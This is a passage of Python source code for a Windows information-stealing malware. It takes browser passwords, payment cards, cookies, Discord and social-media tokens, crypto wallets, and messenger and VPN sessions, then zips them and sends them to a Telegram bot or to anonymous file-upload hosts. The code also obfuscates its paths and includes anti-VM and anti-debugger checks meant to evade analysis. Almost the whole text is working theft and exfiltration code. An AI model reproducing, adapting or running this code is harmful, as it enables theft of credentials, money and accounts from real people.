                [f"{self.LocalAppData}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
                [f"{self.LocalAppData}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
            ]

            Discord = 'drocsiD'
            Lightcord = 'drocthgiL'
            BTPdiscord = 'btpdrocsid'
            Canary = 'yranacdrocsid'

            discordPaths = [        
                [f"{self.RoamingAppData}/{Discord[::-1]}", "/Local Storage/leveldb"],
                [f"{self.RoamingAppData}/{Lightcord[::-1]}", "/Local Storage/leveldb"],
                [f"{self.RoamingAppData}/{Canary[::-1]}", "/Local Storage/leveldb"],
                [f"{self.RoamingAppData}/{BTPdiscord[::-1]}", "/Local Storage/leveldb"],
            ]                    

            try:
                for patt in browserPaths:
                    await GetToken(patt[0], patt[2])
                for patt in discordPaths:
                    await GetDiscord(patt[0], patt[1])
            except Exception:
                await error_handler()

        except Exception:
            await error_handler()








    async def InsideFolder(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)

            if os.path.isdir(filePath):
                shutil.rmtree(filePath)

            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Computer"))
            os.mkdir(os.path.join(filePath, "Browsers"))
            os.mkdir(os.path.join(filePath, "Sessions"))
            
          
            if ListFonction.SystemInfo:
                with open(os.path.join(filePath, "Computer", "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SystemInfo:
                        file.write(value)
            if ListFonction.ClipBoard:
                with open(os.path.join(filePath, "Computer", "clipboard_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.ClipBoard:
                        file.write(value)
            if ListFonction.InstalledSoftware:
                with open(os.path.join(filePath, "Computer", "softwares_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.InstalledSoftware:
                        file.write(value)
            if ListFonction.TasksList:
                with open(os.path.join(filePath, "Computer", "tasklist_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TasksList:
                        file.write(value)
            if ListFonction.Network:
                with open(os.path.join(filePath, "Computer", "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Network:
                        file.write(value)
            if ListFonction.Processes:
                with open(os.path.join(filePath, "Computer", "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Processes:
                        file.write(value)



            if ListFonction.Passwords:
                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for passwords in ListFonction.Passwords:
                        file.write(passwords)
            if ListFonction.Cards:
                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for cards in ListFonction.Cards:
                        file.write(cards)
            if ListFonction.Cookies:
                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for cookies in ListFonction.Cookies:
                        file.write(cookies)
            if ListFonction.Autofills:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for autofill in ListFonction.Autofills:
                        file.write(autofill)


            if ListFonction.RedditAccounts:
                with open(os.path.join(filePath, "Sessions", "reddit_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.RedditAccounts:
                        file.write(value)
            if ListFonction.InstagramAccounts:
                with open(os.path.join(filePath, "Sessions", "instagram_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.InstagramAccounts:
                        file.write(value)
            if ListFonction.GuildedAccounts:
                with open(os.path.join(filePath, "Sessions", "guilded_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.GuildedAccounts:
                        file.write(value)
            if ListFonction.PatreonAccounts:
                with open(os.path.join(filePath, "Sessions", "patreon_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.PatreonAccounts:
                        file.write(value)
            if ListFonction.SpotifyAccount:
                with open(os.path.join(filePath, "Sessions", "spotify_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SpotifyAccount:
                        file.write(value)
            if ListFonction.TwitchAccounts:
                with open(os.path.join(filePath, "Sessions", "twitch_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TwitchAccounts:
                        file.write(value)
            if ListFonction.TwitterAccounts:
                with open(os.path.join(filePath, "Sessions", "twitter_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TwitterAccounts:
                        file.write(value)
            if ListFonction.TikTokAccounts:
                with open(os.path.join(filePath, "Sessions", "tiktok_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TikTokAccounts:
                        file.write(value)
            if ListFonction.RiotUserAccounts:
                with open(os.path.join(filePath, "Sessions", "riot_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.RiotUserAccounts:
                        file.write(value)
            if ListFonction.SteamUserAccounts:
                with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SteamUserAccounts:
                        file.write(value)
            if ListFonction.RobloxAccounts:
                with open(os.path.join(filePath, "Sessions", "roblox_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.RobloxAccounts:
                        file.write(value)
            if ListFonction.DiscordAccounts:
                with open(os.path.join(filePath, "Sessions", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.DiscordAccounts:
                        file.write(value)


            if len(os.listdir(os.path.join(filePath, "Computer"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Computer"))
                except:pass

            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Browsers"))
                except:pass


            if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Sessions"))
                except:pass

            tasks = [
                self.StealWallets(filePath),
                self.StealTelegramSession(filePath),
                self.StealWhatsApp(filePath),
                self.StealSignal(filePath),
                self.StealSkype(filePath),
                self.StealElement(filePath),
                self.StealProtonVPN(filePath),
                self.StealOpenVPN(filePath),
                self.StealSurfsharkVPN(filePath),
                self.StealPidgin(filePath),
                self.StealTox(filePath),
                self.StealViber(filePath),
                self.StealFileZilla(filePath),
                self.StealPasswordManagers(filePath),
                self.StealWinSCP(filePath),
                self.BackupMailbird(filePath),
                self.BackupThunderbird(filePath)
            ]
            
            await asyncio.gather(*tasks)
            
            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients"]
            
            for folder in folders_to_check:
                try:
                    if len(os.listdir(os.path.join(filePath, folder))) == 0:
                        shutil.rmtree(os.path.join(filePath, folder))
                except Exception:
                    await error_handler()


        except Exception:
            await error_handler()

    async def SendKeyWords(self) -> None:
        try:
            cookies = []
            passwords = []
            autofills = []
            
            words = ["keyword_example.com"] 

            for word in words:
                found_autofill = any(word in autofill for autofill in ListFonction.Autofills)
                found_password = any(word in password for password in ListFonction.Passwords)
                found_cookie = any(word in cookie for cookie in ListFonction.Cookies)
                
                if found_cookie: 
                    cookies.append(word)
                if found_password: 
                    passwords.append(word)
                if found_autofill: 
                    autofills.append(word)

            text = f"<b>📚 <i><u>{platform.node()} - Keywords Results</u></i></b>\n\n"
            if cookies: 
                text += f"<b>Cookies:</b>\n<code>{', '.join(cookies if cookies else None)}</code>\n"
            if passwords: 
                text += f"<b>Passwords:</b>\n<code>{', '.join(passwords if passwords else None)}</code>\n"
            if autofills: 
                text += f"<b>Autofills:</b>\n<code>{', '.join(autofills if autofills else None)}</code>\n"

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    pass

        except Exception:
            await error_handler()

    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)

            text = f"""
<b>👤  <i><u>{platform.node()} - Files Counts</u></i></b>

<b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
<b>Passwords:</b> <code>{str(len(ListFonction.Passwords))}</code>
<b>Cookies:</b> <code>{str(len(ListFonction.Cookies))}</code>
<b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>
"""

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    pass

            await self.SendKeyWords()
            
            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
                send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                document_payload = {
                    'chat_id': CHAT_ID,
                }

                requests.post(send_document_url, data=document_payload, files={'document': open(filePath + ".zip", 'rb')})
            
            else:
                file_url = await UploadFiles.upload_file(filePath + ".zip")

                if file_url is not None:
                    text = f"<b>{platform.node()} - File Link</b>\n\n<b>{file_url}</b>"

                    message_payload = {
                        'chat_id': CHAT_ID,
                        'text': text,
                        'parse_mode': 'HTML'
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.post(send, data=message_payload) as response:
                            pass
                else:
                    text = "<b>Can't Send File With GoFile</b>"

                    message_payload = {
                        'chat_id': CHAT_ID,
                        'text': text,
                        'parse_mode': 'HTML'
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.post(send, data=message_payload) as response:
                            pass

            try:

                os.remove(filePath + ".zip")
                shutil.rmtree(filePath)

            except Exception:
                await error_handler()

        except Exception:
            await error_handler()
        

class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception:
            await error_handler()
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()

            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        return data["data"]["downloadPage"]
        except Exception:
            await error_handler()
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')

                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        return result
        except Exception:
            await error_handler()
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            await error_handler()
                            return None
        except Exception:
            await error_handler()
            return None

    @staticmethod
    async def upload_uguu(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                        data = await response.json()
                        return data.get("url")
        except Exception:
            await error_handler()
            return None

    @staticmethod
    async def upload_anonfiles(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post('https://api.anonfiles.com/upload', data=form) as response:
                        data = await response.json()
                        return data["data"]["file"]["url"]["full"]
        except Exception:
            await error_handler()
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
            ('GoFile', UploadFiles.upload_gofile),
            ('Uguu', UploadFiles.upload_uguu),
            ('AnonFiles', UploadFiles.upload_anonfiles),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception:
                await error_handler()
                continue
        
        return "All upload attempts failed."

class InfoStealer:
    def __init__(self):
        self.loop = asyncio.get_event_loop()

    async def run_all_fonctions(self):
        await asyncio.gather(
            self.StealLastClipBoard(),
            self.StealNetworkInformation(),
            self.StealInstalledSoftware(),
            self.StealProcesses(),
            self.StealTasks(),
            self.StealSystemInfo()
        )
    
    async def get_command_output(self, command: str) -> str:
        process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
        stdout, stderr = await process.communicate()
        if stderr:
            await error_handler()
        return stdout.decode(errors="ignore")

    async def StealLastClipBoard(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Clipboard")
            if output:
                ListFonction.ClipBoard.append(output)
        except Exception:
            await error_handler()

    async def StealNetworkInformation(self) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data["query"]
                    country = data["country"]
                    city = data["city"]
                    timezone = data["timezone"]
                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
                    ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
        except Exception:
            await error_handler()

    async def StealInstalledSoftware(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version | ConvertTo-Json")
            software_list = json.loads(output)
            ListFonction.InstalledSoftware.extend([f"Name: {software['Name']}, Version: {software['Version']}" for software in software_list])
        except Exception:
            await error_handler()

    async def StealProcesses(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Process | Select-Object -Property Name, Id | ConvertTo-Json")
            processes_list = json.loads(output)
            ListFonction.Processes.extend([f"Name: {process['Name']}, Id: {process['Id']}" for process in processes_list])
        except Exception:
            await error_handler()

    async def StealTasks(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-ScheduledTask | Select-Object -Property TaskName | ConvertTo-Json")
            tasks_list = json.loads(output)
            ListFonction.TasksList.extend([f"TaskName: {task['TaskName']}" for task in tasks_list])
        except Exception:
            await error_handler()

    async def StealSystemInfo(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-ComputerInfo | ConvertTo-Json")
            system_info = json.loads(output)
            ListFonction.SystemInfo.append(f"OS: {system_info['WindowsVersion']}, Architecture: {system_info['ArchitectureType']}")
        except Exception:
            await error_handler()




class anti_vm:
    async def run_all_fonctions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception:
            await error_handler()

    async def check_disk_space(self) -> bool:
        try:
            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 50:
                ctypes.windll.kernel32.ExitProcess(0)
            min_disk_space_gb = 50
            if len(sys.argv) > 1:
                min_disk_space_gb = float(sys.argv[1])
            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
            if free_space_gb < min_disk_space_gb:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

    async def check_recent_files(self) -> bool:
        try:
            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
            if len(os.listdir(recent_files_folder)) < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 50:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 6:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            video_controller_info = stdout.decode(errors='ignore').splitlines()
            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

    async def check_for_suspicious_files(self) -> None:
        try:
            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
            if os.path.exists(temp_file_path):
                ctypes.windll.kernel32.ExitProcess(0)
            try:
                machine_name = platform.uname().machine.lower()
                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
                    ctypes.windll.kernel32.ExitProcess(0)
            except AttributeError:
                pass

            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
          
            running_processes = [
                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
                if process.name().lower() in suspicious_process_names
            ]
            if running_processes:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

    async def check_system_manufacturer(self) -> None:
        try:
            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout1, stderr1 = await process1.communicate()

            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout2, stderr2 = await process2.communicate()

            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            await error_handler()

        
if __name__ == '__main__':
    if os.name == "nt":
        anti = anti_vm()
        asyncio.run(anti.run_all_fonctions())

        main = get_data()
        asyncio.run(main.RunAllFonctions())
    else:
        print('run only on windows operating system')
